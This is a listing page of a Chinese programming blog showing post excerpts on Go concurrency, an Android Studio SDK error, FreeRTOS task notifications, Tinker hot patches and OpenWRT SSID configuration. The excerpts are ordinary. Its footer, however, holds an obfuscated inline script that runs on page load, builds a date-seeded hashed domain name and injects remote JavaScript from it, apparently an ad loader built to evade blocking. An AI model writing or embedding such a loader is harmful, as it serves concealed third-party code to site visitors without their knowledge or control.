前段时间，一个2年小伙伴希望涨薪到18K， 尼恩把GO 语言的项目架构，给他写入了简历，导致他的简历金光闪闪，脱胎换股，完全可以去拿头条、腾讯等30K的offer， 年薪可以直接多 20W。
足以说明，GO 架构的含金量。
另外，前面尼恩的云原生是没有涉及GO的，但是，没有GO的云原生是不完整的。
所以， GO语言、GO架构学习完了之后，咱们在去打个回马枪，完成云原生的第二部分: 《Istio + K8S CRD的架构与开发实操》 , 帮助大家彻底穿透云原生。
本文目录 文章目录 说在前面：最终的学习目标本文目录 并发编程Go 协程创建Go 协程（Goroutine）Go标准库 协程同步Mutex互斥锁同步WaitGroup 等待组Cond（条件变量） channel 通道channel 通道（/信道）的两个基本操作附录：make 函数如何使用？range遍历 和 通道关闭 closeclose Channel 的一些说明 多通道查询select 语句/通道的多路复用Go的select 和 OS的select 对比非阻塞查询 带缓冲的通道 Java BlockingQueue 和 Go channel 对比学习SynchronousQueue VS 无缓冲channelLinkedBlockingQueue VS 缓冲通道 buffered channel操作对比go rocketmq 编程实例：使用 RocketMQ 的 Go 客户端来发送和接收消息消息发送和接受的验证启动 rocketmq启动 go 实例 附录：Go 模块的安装和使用启用 Go 模块创建新项目go.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b535f2ba777bc6b34d5af6e4e666cfc3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c0d80ea30e7b0a26f75eb01b7a6c050/" rel="bookmark">
			奇怪的AndroidStudio报错--checkDebugAarMetadata--修改SDK版本为33成功修复
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Android Studio创建程序时报错
checkDebugAarMetadata:
6 issues were found when checking AAR metadata: 1. Dependency 'androidx.appcompat:appcompat-resources:1.6.1' requires libraries and applications that depend on it to compile against version 33 or later of the Android APIs. :app is currently compiled against android-32. Recommended action: Update this project to use a newer compileSdkVersion of at least 33, for example 33. Note that updating a library or application's compileSdkVersion (which allows newer APIs to be used) can be done separately from updating targetSdkVersion (which opts the app in to new runtime behavior) and minSdkVersion (which determines which devices the app can be installed on).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c0d80ea30e7b0a26f75eb01b7a6c050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bd133f93c081f3b73bb75e82856aece/" rel="bookmark">
			FreeRTOS-任务通知详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		✅作者简介：嵌入式入坑者，与大家一起加油，希望文章能够帮助各位！！！！
📃个人主页：@rivencode的个人主页
🔥系列专栏：玩转FreeRTOS
💬保持学习、保持热爱、认真分享、一起进步！！！
目录 前言一、任务通知的简介二、任务通知源码分析1.发送通知函数xTaskGenericNotify2.接收任务通知 ulTaskNotifyTake()3.接收任务通知函数xTaskNotifyWait() 三.总结 前言 FreeRTOS越学越简单，前面已经把真实的队列、信号量、事件组全部学完，现在学个任务通知去模拟这些东西，真的都学会了，模拟的还不会嘛，所以我们的本文的重点主要有两点：1.搞明白任务通知的三个状态(实现任务通知的关键)，2.明白任务通知的优缺点，以及任务通知模拟出来的队列、信号量、事件组与真实的有何区别。
一、任务通知的简介 说是任务通知，倒不如说通知任务，所谓任务通知核心就是一个32位的无符号整数和一个8位的通知状态，而这两玩意就在任务控制块中，则所谓通知任务就是一个任务或者中断改写另外一个任务中的32位的无符号整数，只不过改写这个整数的方式可以有所不同(1.可以让这个整数加1: 模拟信号量 2. 设置该整数的指定的某些位：模拟事件组 3.直接选择覆盖或者不覆盖写入： 模拟消息队列)。
1.任务的通知状态：任务通知有三种状态 未等待通知状态：就是任务的初始状态
等待通知状态：当任务在没有通知的时候接收通知时(也就是任务没有接收到通知的时候调用了接收通知的函数，则此时必定接收不到通知，把该任务标记为等待通知状态(去等别的任务发给我通知)，任务进入阻塞态)，这样做的用处是什么呢？ 答：当另外一个任务发通知给该任务时，此时发现任务处于等待通知的状态，然后就可以即可把该任务唤醒。
等待接收通知状态：当有其他任务向任务发送通知，但任务还未接收这一通知的这段期间内(当其他任务给该任务发了通知，但是该任务还没有接收，则将该任务标记为等待接收通知状态)，这样做的用处就是当该任务调用了接收通知的函数，发现自身的状态为等待接收通知状态，则不用进入阻塞，直接接收通知值。
为什么要搞一个这样的通知状态？
答：
1.为了判断任务是否接收到了通知
2.不需要一个链表来挂载因等不到通知而阻塞任务，可以直接将任务挂入阻塞链表，因为当调用发送通知函数去唤醒该任务时只需要判断它是否处于等待通知状态(因等待通知进入阻塞)。
像队列它有一个当前消息个数的变量可以知道队列中是否有消息，像信号量0就是没消息
那为什么任务通知不能以通知值是否为0判断是否有消息呢？
确实模拟信号量确实是怎么做的，但是如果是模拟队列的话，就不能怎么搞了，因为我发送一个0，0也算是数据，所以需要一个
如果现在还搞不懂这三个状态什么意思，没关系看后面的源码就懂了。
2.任务通知的优缺点： (1).任务通知的优点
按照FreeRTOS官方的说法使用任务通知比通过队列、事件标志组或信号量通信方式解除阻塞的任务要快 45%，并且更加省 RAM 内存空间，因为像队列、信号量、事件组这些通信方式使用前必须先创建，拿队列来说如下图所示，申请内存的时候至少需要下图这么多变量，而任务通知是任务结构体中自带的一个32位的无符号整数，一个8位的通知状态变量，一共就5个字节。
使用任务通知不需要创建，因为当创建任务的时候就已经默认创建了这两个变量，任务控制块中的两个变量如下图所示，当然这里是一个数组(为了方便以后扩展)，但是数组的元素个数默认为1。
(2).任务通知的缺点
虽然说任务通知可以模拟这么多通信方式，但是肯定有限制、有缺点，不然还要这些队列、信号量、事件组干嘛。
1.不能发送通知到中断
原因很简单，任务通知、任务通知，人家通知的是任务，是修改任务控制块中那个32位无符号整数的值，中断并没有任务控制块这一说，但为什么队列、信号量、事件组这些就可以呢，说到底人家创建了一个独立的队列、信号量、事件组结构体当然谁都可以访问里面的内容，但是可以在中断中发送通知给其他任务，这个是没毛病的。
2.不能发送通知给多个任务
任务通知只能指定发送给某一个任务而不能广播，而队列、信号量、事件组任何中断和任务都能访问，不过很少出现多个任务或中断接收同一个通讯对象的情况
3.发送通知的任务不能进入阻塞
只有等待通知的任务可以被阻塞，发送通知的任务，在任何情况下都不会因为发送失败而进入阻塞态，像队列：写队列当队列满的时候，可以进入阻塞态
4.通知值只有一个32位的无符号的整形
加粗样式不像队列，可以缓存多个任意类型的数据，而任务通知只有一个消息，而且只能作用一次(接收到通知值等待通知的任务才能被唤醒)
接下来就开始分析任务通知有关函数的源码，其中会穿插着讲解用任务通知模拟出来的队列、信号量、事件组与真实的有何区别。
二、任务通知源码分析 任务通知的创建就不用说了，任务被创建时则就便有了任务通知，而且FreeRTOS默认任务通知是开启的。
1.发送通知函数xTaskGenericNotify FreeRTOS定义了三个发送通知的函数，其实他们都是宏定义最终调用的是xTaskGenericNotify()，只不过他们的传入的参数有所区别，这都是FreeRTOS的老套路了，所以我们先分析完xTaskGenericNotify()函数的实现，再谈谈这三个函数应用上有何区别。
1.xTaskGenericNotify()函数原型：
函数参数：
1.xTaskToNotify：传入接收任务通知的任务控制块
2.uxIndexToNotify：任务的指定通知（任务通知相关数组下标，默认为0，使用数组第一个元素当做通知）
3.ulValue：要写入的通知值
4.eAction：通知的方式(模拟信号量，消息队列、事件组中方式)，可取的值如下所示
第一个取值：只起通知作用也是有用的，至少可以唤醒，因未等待到通知而阻塞的任务。 5.pulPreviousNotificationValue：用于获取发送通知前的通知值
函数返回值
pdPASS 任务通知发送成功
pdFAIL 任务通知发送失败 2.TaskGenericNotify()源码分析：
#if ( configUSE_TASK_NOTIFICATIONS == 1 ) BaseType_t xTaskGenericNotify( TaskHandle_t xTaskToNotify, UBaseType_t uxIndexToNotify, uint32_t ulValue, eNotifyAction eAction, uint32_t * pulPreviousNotificationValue ) { TCB_t * pxTCB; BaseType_t xReturn = pdPASS; uint8_t ucOriginalNotifyState; configASSERT( uxIndexToNotify &lt; configTASK_NOTIFICATION_ARRAY_ENTRIES ); configASSERT( xTaskToNotify ); pxTCB = xTaskToNotify; taskENTER_CRITICAL(); { /* 判断是否需要通知前的通知值 */ if( pulPreviousNotificationValue !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bd133f93c081f3b73bb75e82856aece/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42fa5d8782d70e39e9586e9674030073/" rel="bookmark">
			【Tinker】踩坑之路（1）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【Tinker】踩坑之路（1） 1、找不到 variantConfiguration No such property: variantConfiguration for class: com.android.build.gradle.internal.variant.ApplicationVariantData
https://github.com/Tencent/tinker/issues/1357
降低 build:gradle 版本，之前是 4.1.0 classpath “com.android.tools.build:gradle:3.5.3”
2、tinkerId is not set!!! 变量生成放在最前面 tip：偶现，概率较小，清理项目重启 AndroidStudio 又好了，那就这样吧！
3、Cannot get property ‘tinkerId’ on extra properties extension as it does not exist build.gradle 中变量声明放在文件最前面 4、buildConfigField 指定参数，BuildConfig 类生成的字符串赋值错误 错误示例：
正确示例：
字符串得加转义字符 5、Tinker Exception:createInlineFence failed 启动闪退 Unable to instantiate application SampleApplication
我是通过重写 DefaultApplicationLike设置注解 @DefaultLifeCycle(application = "com.example.tinkerdemo.SampleApplication")
忘记修改 AndroidManifest application 标签 name 属性值导致，改成与上述值保持一致即可，注解指定的 Applicantion 类在构建过程中由 gradle 生成 6、isIgnoreWarning=false，补丁构建失败 Warning:ignoreWarning is false, manifest was changed, while hot plug component support mode is disabled.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42fa5d8782d70e39e9586e9674030073/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9fc6d33b57528a4d65f35a373960b3e/" rel="bookmark">
			OpenWRT 中修改SSID的文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件位置：/....../package/ramips/drivers/mt7628/files/mt7628.sh
//---------------------------------------------文件中option ssid处修改如下：
detect_mt7628() {
# detect_ralink_wifi mt7628 mt7628
ssid=mt7628-`ifconfig eth0 | grep HWaddr | cut -c 51- | sed 's/://g'`
cd /sys/module/
[ -d $module ] || return
[ -e /etc/config/wireless ] &amp;&amp; return
cat &lt;&lt;EOF
config wifi-device mt7628
option type mt7628
option vendor ralink
option band 2.4G
option channel 0
option auotch 2
config wifi-iface
option device mt7628
option ifname ra0
option network lan
option mode ap
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9fc6d33b57528a4d65f35a373960b3e/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/135/">«</a>
	<span class="pagination__item pagination__item--current">136/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/137/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>